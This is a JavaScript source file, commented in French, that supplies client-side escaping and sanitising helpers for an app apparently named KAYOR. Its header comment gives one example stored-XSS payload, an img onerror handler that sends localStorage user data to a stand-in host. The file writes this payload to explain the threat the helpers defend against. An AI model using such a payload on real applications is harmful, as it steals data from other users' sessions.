/**
 * KAYOR — Utilitaires de sécurité côté client
 * ---------------------------------------------------------------------------
 * À charger AVANT app.js et client.js.
 *
 * Pourquoi : l'application construit ses tableaux avec innerHTML et des
 * template literals (`${client.nom}`). Une donnée saisie par un utilisateur
 * est donc interprétée comme du HTML. Un client enregistré sous le nom
 *
 *     <img src=x onerror="fetch('https://x.tld?d='+localStorage.marjan_users)">
 *
 * exécute du JavaScript dans la session de l'administrateur qui ouvre la
 * fiche — et exfiltre la base locale. En SaaS, la donnée d'un tenant
 * deviendrait une porte d'entrée chez un autre.
 *
 * Règle : toute valeur venant de la base ou d'un formulaire passe par esc()
 * avant d'être injectée dans du HTML.
 */

(function (global) {
  'use strict';

  var MAP = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#39;',
    '`': '&#96;'
  };

  /**
   * Échappe une valeur destinée à du contenu HTML ou un attribut entre quotes.
   * esc(null) et esc(undefined) renvoient '' — jamais "null" à l'écran.
   */
  function esc(v) {
    if (v === null || v === undefined) return '';
    return String(v).replace(/[&<>"'`]/g, function (c) { return MAP[c]; });
  }

  /**
   * Échappe une valeur insérée dans un gestionnaire inline :
   *   onclick="supprimer('${escJs(id)}')"
   * Neutralise quotes, backslashes et fins de ligne.
   */
  function escJs(v) {
    if (v === null || v === undefined) return '';
    return String(v)
      .replace(/\\/g, '\\\\')
      .replace(/'/g,  "\\'")
      .replace(/"/g,  '\\"')
      .replace(/\n/g, '\\n')
      .replace(/\r/g, '\\r')
      .replace(/</g,  '\\u003C');
  }

  /**
   * Tag de template : échappe automatiquement toutes les interpolations.
   *
   *   el.innerHTML = html`<td>${client.nom}</td>`;
   *
   * Pour insérer du HTML volontairement (une icône, un fragment déjà
   * échappé), l'envelopper dans raw().
   */
  function html(strings) {
    var out = strings[0];
    for (var i = 1; i < arguments.length; i++) {
      var v = arguments[i];
      out += (v && v.__raw === true ? v.value : esc(v)) + strings[i];
    }
    return out;
  }

  /** Marque un fragment comme déjà sûr — à n'utiliser que sur du HTML maîtrisé. */
  function raw(value) {
    return { __raw: true, value: value === null || value === undefined ? '' : String(value) };
  }

  /**
   * Nettoie un identifiant métier (V-KAY-001, C-004, réf. stock).
   * Utilisé avant de le placer dans une URL PostgREST ou un onclick.
   */
  function safeId(v) {
    return String(v === null || v === undefined ? '' : v).replace(/[^A-Za-z0-9_\-.]/g, '');
  }

  /** Entier borné — refuse NaN, Infinity, négatifs et montants aberrants. */
  function safeInt(v, min, max) {
    var n = parseInt(v, 10);
    if (!isFinite(n)) return null;
    if (min !== undefined && n < min) return null;
    if (max !== undefined && n > max) return null;
    return n;
  }

  global.esc     = esc;
  global.escJs   = escJs;
  global.html    = html;
  global.raw     = raw;
  global.safeId  = safeId;
  global.safeInt = safeInt;

})(window);
